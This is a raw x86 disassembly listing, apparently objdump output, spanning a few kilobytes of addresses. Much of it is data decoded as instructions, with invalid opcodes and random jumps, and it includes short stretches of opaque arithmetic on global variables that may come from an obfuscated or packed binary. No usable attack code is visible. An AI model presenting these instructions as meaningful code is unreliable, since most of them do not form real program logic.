  40d608:	xor    BYTE PTR [edi-0x2a22488b],bl
  40d60e:	int    0x53
  40d610:	aas    
  40d611:	mov    cl,cl
  40d613:	dec    ecx
  40d614:	sbb    DWORD PTR [edi+eiz*8],eax
  40d617:	jns    0x40d620
  40d619:	je     0x40d606
  40d61b:	add    BYTE PTR [esp+eax*2+0x60d20ee6],ch
  40d622:	mov    al,ds:0xf245ec7c
  40d627:	adc    DWORD PTR [esi-0xf75ecbd],0x9f656841
  40d631:	or     eax,0xba633a4f
  40d636:	push   edi
  40d637:	or     al,0x53
  40d639:	xchg   ebp,eax
  40d63a:	add    eax,0xc880ca4c
  40d63f:	imul   ebx,DWORD PTR [edi+ebx*2],0xffffff9a
  40d643:	pop    es
  40d644:	and    DWORD PTR [ebx+0xa131a12],esi
  40d64a:	mov    cl,0x92
  40d64c:	dec    eax
  40d64d:	fs call 0x75b05e1f
  40d653:	mov    ecx,0x7cee340b
  40d658:	sbb    eax,0x848dff5f
  40d65d:	stos   BYTE PTR es:[edi],al
  40d65e:	ficomp DWORD PTR [ebx]
  40d660:	dec    bp
  40d662:	sub    eax,0x2785edaa
  40d667:	mov    ecx,0xa8929043
  40d66c:	lods   al,BYTE PTR ds:[esi]
  40d66d:	test   DWORD PTR [eax-0x69018c27],esi
  40d673:	aas    
  40d674:	xor    ebp,ebx
  40d676:	fld    TBYTE PTR [esi-0x456dbe44]
  40d67c:	fst    DWORD PTR [esi]
  40d67e:	inc    edx
  40d67f:	and    eax,0xffc5433f
  40d684:	pop    edx
  40d685:	mov    bl,0xcf
  40d687:	sbb    al,0xe8
  40d689:	xor    DWORD PTR [ebx-0x266cd5de],esp
  40d68f:	sub    BYTE PTR [edx+ecx*2],bh
  40d692:	scas   al,BYTE PTR es:[edi]
  40d693:	pusha  
  40d694:	fsubr  QWORD PTR [eax]
  40d696:	adc    esp,edx
  40d698:	xchg   ecx,eax
  40d699:	aas    
  40d69a:	das    
  40d69b:	mov    ah,0xad
  40d69d:	adc    al,BYTE PTR [eax+0x6b]
  40d6a0:	adc    bl,BYTE PTR [ebp+ebp*1+0x60]
  40d6a4:	sbb    eax,0x65e463be
  40d6a9:	enter  0x6888,0xc6
  40d6ad:	in     al,dx
  40d6ae:	cmp    eax,0x638724d7
  40d6b3:	pop    esp
  40d6b4:	mov    dl,0x55
  40d6b6:	fstp   TBYTE PTR [edx]
  40d6b8:	mov    dl,0x3
  40d6ba:	lahf   
  40d6bb:	mov    ds:0xd9fef2a,al
  40d6c0:	fldenv [edi]
  40d6c2:	in     al,0x8a
  40d6c4:	jge    0x40d732
  40d6c6:	pop    eax
  40d6c7:	sub    eax,DWORD PTR ds:0x808754c
  40d6cd:	les    ebx,FWORD PTR es:[edx-0x1f]
  40d6d1:	sbb    al,0xa1
  40d6d3:	and    BYTE PTR [esi],cl
  40d6d5:	fiadd  DWORD PTR [edx+0x3d]
  40d6d8:	cmp    DWORD PTR [esi-0x1407474b],edi
  40d6de:	lds    esp,FWORD PTR [ecx]
  40d6e0:	or     eax,0x279653a3
  40d6e5:	cmp    bl,BYTE PTR [ebp+ecx*4+0x10]
  40d6e9:	or     eax,0x35bd9b93
  40d6ee:	ret    
  40d6ef:	jecxz  0x40d703
  40d6f1:	int    0x45
  40d6f3:	leave  
  40d6f4:	(bad)  
  40d6f5:	fimul  DWORD PTR [esi]
  40d6f7:	cmp    BYTE PTR [ebx],cl
  40d6f9:	cmc    
  40d6fa:	push   0x42
  40d6fc:	xchg   BYTE PTR [esi+0x40],cl
  40d6ff:	test   DWORD PTR [ebp+0x59d7f0c3],esp
  40d705:	jl     0x40d75b
  40d707:	pop    es
  40d708:	mov    ecx,0xdc328b75
  40d70d:	cli    
  40d70e:	fnstcw WORD PTR [esi-0x5e]
  40d711:	pop    edx
  40d712:	dec    ebp
  40d713:	push   es
  40d714:	fwait
  40d715:	dec    esp
  40d716:	cmp    eax,0xb0261037
  40d71b:	jmp    FWORD PTR [ecx-0x12]
  40d71e:	inc    edi
  40d71f:	mov    dl,0x14
  40d721:	shl    BYTE PTR [ebp-0x4],cl
  40d724:	lahf   
  40d725:	adc    DWORD PTR [esi-0x4c],ebx
  40d728:	hlt    
  40d729:	pop    ss
  40d72a:	nop
  40d72b:	cmp    al,0x14
  40d72d:	or     cl,ah
  40d72f:	mov    dl,0xe8
  40d731:	inc    edx
  40d732:	aam    0x42
  40d734:	scas   al,BYTE PTR es:[edi]
  40d735:	in     al,0x53
  40d737:	mov    cl,0x56
  40d739:	dec    ebx
  40d73a:	mov    DWORD PTR [ecx-0x65d857bc],esi
  40d740:	dec    ebp
  40d741:	xchg   ebx,eax
  40d742:	lea    esp,[ebp+0x3e]
  40d745:	mov    ecx,0xde574dca
  40d74a:	xor    ebx,DWORD PTR [ebp+0x1]
  40d74d:	clc    
  40d74e:	call   0x2c7a:0x80af5b06
  40d755:	sub    eax,0x6066476
  40d75a:	shl    BYTE PTR [edi],1
  40d75c:	xchg   ecx,eax
  40d75d:	jns    0x40d71f
  40d75f:	cmp    ah,BYTE PTR [ecx-0x23]
  40d762:	push   DWORD PTR [ebx-0x31]
  40d765:	enter  0x5113,0xf8
  40d769:	xchg   esi,eax
  40d76a:	cmp    edx,DWORD PTR [esi-0x2d65711a]
  40d770:	in     eax,0xe7
  40d772:	mov    cl,0xac
  40d774:	sar    DWORD PTR [ecx],0x42
  40d777:	test   al,0xcf
  40d779:	mov    BYTE PTR [ecx+0x7c],ch
  40d77c:	popf   
  40d77d:	dec    ecx
  40d77e:	pusha  
  40d77f:	jne    0x40d7ed
  40d781:	and    al,0xc6
  40d783:	imul   eax,DWORD PTR es:[edi+ebx*4+0x62],0x73c6512b
  40d78c:	add    eax,0xff56d546
  40d791:	add    bh,BYTE PTR [ebx]
  40d793:	daa    
  40d794:	test   al,0xc6
  40d796:	pop    ecx
  40d797:	jmp    0x40d7e3
  40d799:	add    edi,DWORD PTR [ebp+0x4a5e5a2a]
  40d79f:	faddp  st(6),st
  40d7a1:	pushf  
  40d7a2:	test   eax,0x8670c2c6
  40d7a7:	xchg   eax,ecx
  40d7a9:	inc    edi
  40d7aa:	jp     0x40d7f8
  40d7ac:	jb     0x40d7b8
  40d7ae:	adc    eax,0x866e0572
  40d7b3:	sub    BYTE PTR [ecx+edx*8+0xe],dl
  40d7b7:	retf   
  40d7b8:	mov    bl,0xac
  40d7ba:	addr16 and eax,0x33cff81
  40d7c0:	add    BYTE PTR [eax],al
  40d7c2:	mov    DWORD PTR ds:0x42a7dd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7e5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi+0xe70e45d]
  40d7eb:	mov    ds:0x78a959a4,eax
  40d7f0:	js     0x40d827
  40d7f2:	jle    0x40d86c
  40d7f4:	js     0x40d7f5
  40d7f6:	xchg   edi,eax
  40d7f7:	ins    BYTE PTR es:[edi],dx
  40d7f8:	mov    WORD PTR [eax+eiz*1],ds
  40d7fb:	push   ebp
  40d7fc:	inc    edx
  40d7fd:	inc    ebp
  40d7fe:	sub    eax,0x9b4d9962
  40d803:	sbb    DWORD PTR [edx],ebx
  40d805:	mov    esi,0xcbcace4e
  40d80a:	jecxz  0x40d7ba
  40d80c:	mov    dh,0xd8
  40d80e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d80f:	jmp    0x40d844
  40d811:	cmp    al,bh
  40d813:	aam    0xc5
  40d815:	jmp    0x40d7b1
  40d817:	ucomiss xmm5,xmm3
  40d81a:	in     al,dx
  40d81b:	or     al,0x7e
  40d81d:	fwait
  40d81e:	xor    DWORD PTR [ecx-0x517642a0],0xffffffcb
  40d825:	les    edi,FWORD PTR [ecx+0x6dfbce85]
  40d82b:	inc    ebp
  40d82c:	dec    eax
  40d82d:	enter  0x4bd9,0xd8
  40d831:	mov    eax,ds:0x8f57df73
  40d836:	cli    
  40d837:	dec    ebp
  40d838:	ins    DWORD PTR es:[edi],dx
  40d839:	int3   
  40d83a:	int3   
  40d83b:	sbb    al,0x66
  40d83d:	inc    edx
  40d83e:	inc    eax
  40d83f:	retf   0xa90
  40d842:	adc    edi,DWORD PTR [eax-0x72]
  40d845:	out    dx,eax
  40d846:	cmp    ecx,esp
  40d848:	pusha  
  40d849:	in     eax,0x5b
  40d84b:	(bad)  
  40d84c:	jae    0x40d82b
  40d84e:	jl     0x40d885
  40d850:	push   0xffffff96
  40d852:	adc    BYTE PTR [eax],bl
  40d854:	jp     0x40d81e
  40d856:	dec    edx
  40d857:	push   edi
  40d858:	push   ecx
  40d859:	aam    0xca
  40d85b:	out    0x17,al
  40d85d:	mov    eax,ds:0xe94d9d2
  40d862:	lea    ebp,[edi-0x530147ed]
  40d868:	lahf   
  40d869:	xor    ah,BYTE PTR [edi-0x4f846299]
  40d86f:	sbb    ecx,DWORD PTR [eax-0x536226b6]
  40d875:	fcom   QWORD PTR ds:0xed6c9558
  40d87b:	test   BYTE PTR [ecx],dl
  40d87d:	ret    
  40d87e:	nop
  40d87f:	jae    0x40d8c9
  40d881:	icebp  
  40d882:	rcr    DWORD PTR [edx+0x26115768],0xc7
  40d889:	retf   
  40d88a:	int3   
  40d88b:	sbb    cl,ah
  40d88d:	test   al,0x2
  40d88f:	nop
  40d890:	div    BYTE PTR [eax+0x7d72b045]
  40d896:	xchg   esi,eax
  40d897:	loop   0x40d8b8
  40d899:	enter  0x8711,0x3
  40d89d:	shl    DWORD PTR [esi-0x24],cl
  40d8a0:	jae    0x40d8b7
  40d8a2:	outs   dx,BYTE PTR ds:[esi]
  40d8a3:	in     eax,0x6a
  40d8a5:	push   ebx
  40d8a6:	sbb    eax,0x3ea8393e
  40d8ab:	clc    
  40d8ac:	cli    
  40d8ad:	mov    DWORD PTR [ecx-0x63],ecx
  40d8b0:	(bad)  
  40d8b1:	sbb    DWORD PTR [edx],edx
  40d8b3:	cld    
  40d8b4:	mov    bl,0x20
  40d8b6:	add    eax,0x1256392b
  40d8bb:	jo     0x40d927
  40d8bd:	pop    ecx
  40d8be:	pop    esp
  40d8bf:	dec    ecx
  40d8c0:	mov    ds:0xca0c0e39,eax
  40d8c5:	jg     0x40d918
  40d8c7:	cs mov edi,0x34cd1816
  40d8cd:	and    ah,dl
  40d8cf:	add    BYTE PTR [edx-0x4af73a2a],ch
  40d8d5:	xor    DWORD PTR [edx-0x26],edx
  40d8d8:	sub    al,0xbd
  40d8da:	mov    ebx,DWORD PTR [ebx+ecx*1+0x75]
  40d8de:	imul   esp,ebp,0x6f
  40d8e1:	cs cdq 
  40d8e3:	mov    dl,0x4c
  40d8e5:	or     al,0xa7
  40d8e7:	nop
  40d8e8:	test   eax,0x8be380f9
  40d8ed:	pop    DWORD PTR [edi*8-0x70eaeaa8]
  40d8f4:	loopne 0x40d909
  40d8f6:	mov    al,0x4e
  40d8f8:	pop    es
  40d8f9:	in     eax,dx
  40d8fa:	or     eax,0x3b912543
  40d8ff:	mov    edx,0xd72eae26
  40d904:	movaps xmm3,XMMWORD PTR [eax+0x53d414ce]
  40d90b:	mov    dl,0xc0
  40d90d:	sbb    esi,ebx
  40d90f:	and    BYTE PTR [edi+0x379ae444],al
  40d915:	pop    es
  40d916:	into   
  40d917:	sbb    ecx,ebp
  40d919:	adc    esp,DWORD PTR [edx]
  40d91b:	mov    al,dl
  40d91d:	pop    es
  40d91e:	add    ch,BYTE PTR [ebp+eiz*2+0x31105459]
  40d925:	(bad)  
  40d926:	mov    eax,ds:0x988f58f4
  40d92b:	xchg   ecx,eax
  40d92c:	daa    
  40d92d:	xor    eax,0x6bd2f916
  40d932:	cwde   
  40d933:	push   eax
  40d934:	in     eax,dx
  40d935:	push   ecx
  40d936:	inc    esi
  40d937:	inc    eax
  40d938:	ret    0x69ac
  40d93b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d93c:	repnz pop edi
  40d93e:	int    0xd5
  40d940:	jns    0x40d919
  40d942:	adc    DWORD PTR [edi+0x6a],esp
  40d945:	and    edi,0xa3bec424
  40d94b:	mov    esp,0x69be009b
  40d950:	add    edi,esi
  40d952:	jne    0x40d90f
  40d954:	fiadd  DWORD PTR [edi+0x201b72e0]
  40d95a:	dec    edi
  40d95b:	jo     0x40d95d
  40d95d:	dec    ebp
  40d95e:	pop    es
  40d95f:	dec    esi
  40d960:	xor    al,0x93
  40d962:	jns    0x40d92c
  40d964:	jg     0x40d9d9
  40d966:	(bad)  
  40d967:	jno    0x40d91c
  40d969:	inc    edi
  40d96a:	jb     0x40d9bf
  40d96c:	fdiv   DWORD PTR [edi+0x1744cd4a]
  40d972:	into   
  40d973:	xchg   DWORD PTR [edi],ebx
  40d975:	jns    0x40d98c
  40d977:	retf   
  40d978:	mov    bh,0x7a
  40d97a:	and    edx,ebx
  40d97c:	div    BYTE PTR [ecx]
  40d97e:	mov    DWORD PTR [ebx+0x35],ecx
  40d981:	jmp    0x10d69682
  40d986:	mov    DWORD PTR [ebx-0x3c],edi
  40d989:	pop    ebp
  40d98a:	mov    edx,0xa16f5df9
  40d98f:	pop    ebx
  40d990:	push   ds
  40d991:	mov    ebp,0xc638d9a0
  40d996:	cld    
  40d997:	adc    ebp,eax
  40d999:	pop    esi
  40d99a:	in     al,0x6a
  40d99c:	cdq    
  40d99d:	out    0x19,eax
  40d99f:	scas   al,BYTE PTR es:[edi]
  40d9a0:	or     al,0x44
  40d9a2:	fistp  QWORD PTR [si-0x2d]
  40d9a6:	into   
  40d9a7:	sub    BYTE PTR [edx-0x56],0xb8
  40d9ab:	mov    esp,DWORD PTR [edi]
  40d9ad:	das    
  40d9ae:	push   ebx
  40d9af:	and    DWORD PTR [edx-0x20],eax
  40d9b2:	xlat   BYTE PTR ds:[ebx]
  40d9b3:	inc    edi
  40d9b4:	in     al,0xae
  40d9b6:	dec    ebp
  40d9b7:	int    0xad
  40d9b9:	dec    ebp
  40d9ba:	mov    ebp,0xf8e8006a
  40d9bf:	or     eax,0x787f3b76
  40d9c4:	sub    esp,DWORD PTR [esp+edx*4]
  40d9c7:	mov    ds:0x9b13d9f4,al
  40d9cc:	push   cs
  40d9cd:	cmp    al,0xe0
  40d9cf:	jecxz  0x40d98d
  40d9d1:	imul   esi,DWORD PTR [ecx],0x48b34bf5
  40d9d7:	add    al,0xa7
  40d9d9:	add    DWORD PTR [ebx-0x11483cd8],0x5c
  40d9e0:	inc    DWORD PTR [ecx+0x20]
  40d9e3:	loop   0x40d9b8
  40d9e5:	sub    al,0xf9
  40d9e7:	adc    DWORD PTR [esi+0x16],esp
  40d9ea:	loopne 0x40d988
  40d9ec:	mov    ah,0x75
  40d9ee:	cmp    cl,BYTE PTR [edi+0x5c]
  40d9f1:	int3   
  40d9f2:	fnstcw WORD PTR ds:[ebx-0xc]
  40d9f6:	push   edi
  40d9f7:	jle    0x40da66
  40d9f9:	xor    ah,BYTE PTR [edi+0x19]
  40d9fc:	mov    ch,0x33
  40d9fe:	into   
  40d9ff:	add    al,0xad
  40da01:	ins    BYTE PTR es:[edi],dx
  40da02:	inc    edx
  40da03:	jb     0x40d9eb
  40da05:	push   ebx
  40da06:	fcomp  DWORD PTR [ebx+0x1e2e6067]
  40da0c:	mov    esp,0x8c3dde40
  40da11:	test   al,0xbb
  40da13:	repnz dec esp
  40da15:	add    BYTE PTR [ebx+0x1c3045f5],ah
  40da1b:	push   cs
  40da1c:	ss jns 0x40d9b8
  40da1f:	retf   0x5132
  40da22:	mov    ds:0x9af261bd,al
  40da27:	cs adc al,0x33
  40da2a:	popa   
  40da2b:	test   BYTE PTR [esi],ch
  40da2d:	dec    edx
  40da2e:	enter  0x8335,0x65
  40da32:	or     BYTE PTR [eax],al
  40da34:	mov    eax,ds:0x42a851
  40da39:	sbb    eax,DWORD PTR ds:0x42a829
  40da3f:	mov    ds:0x42a851,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a811,0x42a7dd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a821,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a791,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	mov    eax,0x165ed502
  40da82:	scas   al,BYTE PTR es:[edi]
  40da83:	js     0x40dafd
  40da85:	xor    eax,0x4478787e
  40da8a:	fninit 
  40da8c:	inc    ecx
  40da8d:	inc    eax
  40da8e:	jmp    FWORD PTR [edx+0x59b56a1c]
  40da94:	xchg   edi,esi
  40da96:	pop    edx
  40da98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da99:	mov    dl,0x52
  40da9b:	pop    es
  40da9c:	mov    ds,eax
  40da9e:	cmc    
  40da9f:	mov    BYTE PTR [edi-0x2041c66f],ah
  40daa5:	xor    BYTE PTR [eiz*2-0x5a7192f9],bh
  40daac:	sub    DWORD PTR [edx],ebx
  40daae:	mov    esi,0x3859c2f7
  40dab3:	or     DWORD PTR [eax+0x23],ecx
  40dab6:	pop    eax
  40dab7:	adc    eax,0x3d7b0e88
  40dabc:	call   0x6f3a66c3
  40dac1:	fidiv  WORD PTR [edi-0x77]
  40dac4:	dec    ebx
  40dac5:	std    
  40dac6:	cmp    eax,0x94895c95
  40dacb:	into   
  40dacc:	psubsb mm2,QWORD PTR [eax+ecx*2]
  40dad0:	push   cs
  40dad1:	sub    al,BYTE PTR [eax+ecx*1+0x7bb23bb5]
  40dad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dad9:	mov    eax,ds:0xef2711b4
  40dade:	mov    edi,0xc06c2efd
  40dae3:	xor    BYTE PTR [edi-0x294a2e73],ch
  40dae9:	stos   DWORD PTR es:[edi],eax
  40daea:	or     eax,0xffca3245
  40daef:	pop    edx
  40daf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daf1:	pop    ss
  40daf2:	push   ecx
  40daf3:	mov    ebp,esp
  40daf5:	leave  
  40daf6:	cmp    eax,0x8b7258f7
  40dafb:	jle    0x40da8e
  40dafd:	pop    ebx
  40dafe:	xchg   ecx,eax
  40daff:	call   0x458c:0x35d527e6
  40db06:	cmp    al,BYTE PTR [edx-0x8827e6d]
  40db0c:	jae    0x40db5d
  40db0e:	mov    edx,DWORD PTR [edx-0xd]
  40db11:	inc    eax
  40db12:	cli    
  40db13:	ins    BYTE PTR es:[edi],dx
  40db14:	jno    0x40db72
  40db16:	or     al,0x30
  40db18:	push   ecx
  40db19:	imul   ecx,DWORD PTR [esi],0xf8dc6721
  40db1f:	and    BYTE PTR [edx+0x5f],dl
  40db22:	adc    ecx,DWORD PTR [eax]
  40db24:	or     al,BYTE PTR [eax*2+0x178285b]
  40db2b:	mov    esp,0x431f9ded
  40db30:	push   ebx
  40db31:	sub    ch,BYTE PTR [ecx]
  40db33:	mov    cl,BYTE PTR [eax-0x1c]
  40db36:	lods   al,BYTE PTR ds:[esi]
  40db37:	pop    es
  40db38:	jne    0x40db95
  40db3a:	pop    eax
  40db3b:	ins    BYTE PTR es:[edi],dx
  40db3c:	mov    ebp,0x54be6b76
  40db41:	into   
  40db42:	mov    cl,0x83
  40db44:	imul   esp,DWORD PTR [eax],0xc49abbe5
  40db4a:	pusha  
  40db4b:	enter  0x87ef,0xd7
  40db4f:	xor    BYTE PTR [ecx*1-0xe40e063],bl
  40db56:	dec    ebx
  40db57:	sub    BYTE PTR [edx],dh
  40db59:	sti    
  40db5a:	sbb    al,0x70
  40db5c:	out    dx,eax
  40db5d:	retf   
  40db5e:	loop   0x40db26
  40db60:	jmp    DWORD PTR [ecx-0x767e4e47]
  40db66:	dec    eax
  40db67:	or     DWORD PTR [edi],0x65018c46
  40db6d:	loop   0x40db3d
  40db6f:	ds mov bh,0x96
  40db72:	xchg   ecx,eax
  40db73:	xchg   esp,eax
  40db74:	xor    eax,0x190981c5
  40db79:	dec    esp
  40db7a:	push   esp
  40db7b:	test   eax,0xcf0c6928
  40db80:	adc    BYTE PTR [esi-0x42],cl
  40db83:	mov    ebp,0x658052ac
  40db88:	ret    0x9280
  40db8b:	(bad)  
  40db8c:	cmp    DWORD PTR [ecx-0x52257aff],ecx
  40db92:	retf   0x35bc
  40db95:	stos   DWORD PTR es:[edi],eax
  40db96:	sub    al,0x4
  40db98:	js     0x40db50
  40db9a:	retf   
  40db9b:	call   0x240a1ed4
  40dba0:	out    0x97,eax
  40dba2:	or     esp,DWORD PTR [ebx]
  40dba4:	lods   al,BYTE PTR ds:[esi]
  40dba5:	adc    esi,edi
  40dba7:	jne    0x40dc25
  40dba9:	xor    al,0x8d
  40dbab:	mov    ds:0xea9947ec,eax
  40dbb0:	fmul   DWORD PTR [edi+0x2b50b04c]
  40dbb6:	popf   
  40dbb7:	(bad)  
  40dbb8:	aam    0xa9
  40dbba:	fwait
  40dbbb:	shl    DWORD PTR [esi+0xa7f74ba],1
  40dbc1:	push   ds
  40dbc2:	jnp    0x40dbdc
  40dbc4:	add    ch,BYTE PTR gs:[edx-0x329f9d9]
  40dbcb:	cmp    al,dl
  40dbcd:	xlat   BYTE PTR ds:[ebx]
  40dbce:	sbb    BYTE PTR [ebx+0x11380c6a],al
  40dbd4:	mov    esi,0xcefc5c15
  40dbd9:	shl    al,0x4d
  40dbdc:	sbb    eax,0x3547f410
  40dbe1:	fisttp WORD PTR [ebp+0x2eb6d24d]
  40dbe7:	test   al,0x83
  40dbe9:	cmp    dh,BYTE PTR [eax-0x37710e99]
  40dbef:	push   ecx
  40dbf0:	jge    0x40db96
  40dbf2:	mov    eax,ds:0x25399aaa
  40dbf7:	js     0x40dbfe
  40dbf9:	call   FWORD PTR [ecx+0x386be3c9]
  40dbff:	pop    ebp
  40dc00:	or     al,BYTE PTR [esi-0x25f3bc6c]
  40dc06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc07:	jnp    0x40dba9
  40dc09:	or     BYTE PTR [si-0xe],bl
  40dc0d:	in     eax,0xb3
  40dc0f:	cmp    eax,0xaf0212ae
  40dc14:	xor    BYTE PTR [edx+0x3d02a482],bh
  40dc1a:	sti    
  40dc1b:	mov    ebx,0x71aef8de
  40dc20:	cmp    eax,0x3eb08a88
  40dc25:	pop    ebp
  40dc26:	out    0xd8,al
  40dc28:	jmp    0x40dc9f
  40dc2a:	inc    cx
  40dc2c:	mov    esi,0xbf691264
  40dc31:	push   edi
  40dc32:	scas   al,BYTE PTR es:[edi]
  40dc33:	fiadd  WORD PTR [esi-0x78]
  40dc36:	daa    
  40dc37:	imul   BYTE PTR [ecx+0x2ce3d4af]
  40dc3d:	mov    ebp,0xfb0a913c
  40dc42:	ja     0x40dc8a
  40dc44:	mov    ds:0x86cdb115,al
  40dc49:	add    esp,esi
  40dc4b:	inc    eax
  40dc4c:	scas   al,BYTE PTR es:[edi]
  40dc4d:	pushf  
  40dc4e:	mov    al,0xff
  40dc50:	push   edi
  40dc51:	inc    eax
  40dc52:	hlt    
  40dc53:	cdq    
  40dc54:	mov    dl,ah
  40dc56:	dec    ebx
  40dc57:	adc    edi,DWORD PTR [eax-0xac733e7]
  40dc5d:	shl    BYTE PTR [ebx-0x3c035ae1],1
  40dc63:	imul   edx,DWORD PTR [edx-0x6c8fee54],0x63
  40dc6a:	jno    0x40dc9d
  40dc6c:	push   0xe4100df6
  40dc71:	or     dl,bh
  40dc73:	ds dec ecx
  40dc75:	jmp    0xf136:0xfe1bee9a
  40dc7c:	ret    
  40dc7d:	pop    es
  40dc7e:	mov    esp,esp
  40dc80:	jb     0x40dc12
  40dc82:	and    eax,0x167e4eb
  40dc87:	dec    ecx
  40dc88:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc8a:	jecxz  0x40dcdd
  40dc8c:	pop    ss
  40dc8d:	inc    eax
  40dc8e:	mov    ax,0xfd9e
  40dc92:	push   esp
  40dc93:	sub    eax,0x42ed0a1a
  40dc98:	test   al,0x44
  40dc9a:	(bad)  
  40dc9b:	mov    ch,0xf
  40dc9d:	loopne 0x40dcca
  40dc9f:	shr    DWORD PTR [esi+eax*4+0x30],0x7b
  40dca4:	mov    ah,0xf3
  40dca6:	imul   edx,DWORD PTR [ebx+0x53],0xead73b04
  40dcad:	mov    ecx,0x1822d27b
  40dcb2:	mov    ebp,ecx
  40dcb4:	test   al,0x5e
  40dcb6:	mov    dl,0xec
  40dcb8:	shl    BYTE PTR [edx],0x44
  40dcbb:	adc    eax,0xd072aab8
  40dcc0:	loop   0x40dcae
  40dcc2:	out    0x60,al
  40dcc4:	add    eax,DWORD PTR [ebp+0x8]
  40dcc7:	add    DWORD PTR ds:0x42a8a1,0x296a
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a77d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7d5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a851,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a85d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7d9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7d1
  40dd3d:	and    DWORD PTR ds:0x42a7a1,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a891,0x42a89d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	mov    bh,0x8b
  40dd65:	(bad)  
  40dd66:	pop    esi
  40dd67:	shr    DWORD PTR [eax+edi*2+0x787e3578],cl
  40dd6e:	js     0x40ddd7
  40dd70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd71:	out    0x84,eax
  40dd73:	and    al,0x58
  40dd75:	push   ecx
  40dd76:	cmp    DWORD PTR [esi+0x38c98fd0],eax
  40dd7c:	push   es
  40dd7d:	jb     0x40ddf8
  40dd7f:	imul   edx,DWORD PTR [esp+ebp*2],0x588f7bfa
  40dd86:	jg     0x40ddf4
  40dd88:	fist   WORD PTR cs:[ebx]
  40dd8b:	jno    0x40dd60
  40dd8d:	imul   ebp,DWORD PTR [edi-0x69e2de9c],0x43f27260
  40dd97:	fst    QWORD PTR [edx+0xf70cb98]
  40dd9d:	xor    DWORD PTR [ebp+ebx*8+0x484db19f],esp
  40dda4:	cmp    BYTE PTR [ebx-0xe702321],al
  40ddaa:	push   esi
  40ddab:	popf   
  40ddac:	outs   dx,DWORD PTR ds:[esi]
  40ddad:	stc    
  40ddae:	jne    0x40de04
  40ddb0:	arpl   sp,bp
  40ddb2:	pop    ebx
  40ddb3:	xor    eax,0xaaf13b3c
  40ddb8:	push   0xffffff8c
  40ddba:	out    0x57,eax
  40ddbc:	inc    esp
  40ddbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddbe:	outs   dx,DWORD PTR ds:[esi]
  40ddbf:	jp     0x40ddc2
  40ddc1:	jmp    0x40de1b
  40ddc3:	cli    
  40ddc4:	sbb    DWORD PTR [ebx+0x3fc557ed],ebp
  40ddca:	xor    DWORD PTR [edx-0x2],ebx
  40ddcd:	jmp    0x9a78:0x83f68583
  40ddd4:	les    edx,FWORD PTR fs:0x568c4e0a
  40dddb:	scas   al,BYTE PTR es:[edi]
  40dddc:	out    0x8a,eax
  40ddde:	lock fwait
  40dde0:	push   ebx
  40dde1:	mov    ds:0xe8d76820,al
  40dde6:	jb     0x40dd6d
  40dde8:	ret    
  40dde9:	inc    ecx
  40ddea:	inc    ebx
  40ddeb:	jmp    0x40de03
  40dded:	(bad)  
  40ddee:	fnstcw WORD PTR [ecx-0x36148b81]
  40ddf4:	add    BYTE PTR [ecx-0x57],ch
  40ddf7:	out    dx,eax
  40ddf8:	gs add eax,0xd54f8384
  40ddfe:	cwde   
  40ddff:	xor    al,0x39
  40de01:	mov    dl,0xb3
  40de03:	das    
  40de04:	and    BYTE PTR [eax+ecx*2],bh
  40de07:	and    BYTE PTR [ebx],0x4c
  40de0a:	gs jp  0x40ddc4
  40de0d:	sahf   
  40de0e:	es inc edx
  40de10:	adc    edx,DWORD PTR [ebp+0x69]
  40de13:	adc    DWORD PTR [ecx],ebx
  40de15:	jmp    0x3c82:0x37d45a1a
  40de1c:	pop    es
  40de1d:	rcl    BYTE PTR [edi-0x12f8b57d],1
  40de23:	ret    
  40de24:	dec    edx
  40de25:	pop    esp
  40de26:	sbb    al,0xbe
  40de28:	test   al,0x4e
  40de2a:	dec    ebp
  40de2b:	int3   
  40de2c:	shl    BYTE PTR [eax+0x3c45c1cb],0x8d
  40de33:	pop    ds
